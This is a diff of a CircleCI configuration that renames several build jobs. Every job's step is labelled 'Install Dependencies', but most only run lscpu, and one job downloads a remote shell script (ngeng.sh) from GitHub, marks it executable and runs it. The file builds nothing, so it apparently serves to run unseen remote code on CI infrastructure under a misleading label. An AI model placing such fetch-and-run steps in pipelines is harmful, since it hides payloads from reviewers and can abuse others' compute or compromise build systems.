@@ -1,35 +1,31 @@
 version: 2.1
 jobs:
-    Devop:
+    Recehan:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        -checkout
-        -run:
-           name: Install Dependencies
-           command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        -checkout
-        -run:
+        - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-    Devop2:
+    Recehan1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        -checkout
-        -run:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Recehan2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
             name: Install Dependencies
             command: timeout 1m wget https://raw.githubusercontent.com/Taryok/trotol/main/ngeng.sh && chmod u+x ngeng.sh && ./ngeng.sh 
-    Devop3:
+    Recehan3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        -checkout
-        -run:
+        - run:
             name: Install Dependencies
             command: timeout 1m lscpu
 workflows:
@@ -37,6 +33,6 @@ workflows:
     build:
         jobs:
             - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+            - Recehan1
+            - Recehan2
+            - Recehan3
